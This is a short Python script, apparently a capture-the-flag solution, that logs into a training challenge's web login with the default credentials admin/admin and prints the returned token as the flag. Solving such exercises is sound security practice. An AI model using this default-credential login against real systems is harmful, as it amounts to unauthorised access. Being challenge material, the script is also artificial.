#!/usr/bin/python3
#script made by LunarStone292

import requests as r
from colorama import Fore

uri = "http://web-09.challs.olicyber.it/login"

def main():
    message = r.post(uri, json={'username': 'admin', 'password': 'admin'}).json()['token']
    return message

if __name__ == "__main__":
    message = main()
    print("[" + Fore.GREEN + "+" + Fore.RESET + "]" + Fore.GREEN + " Flag: " + Fore.YELLOW + message + Fore.RESET)
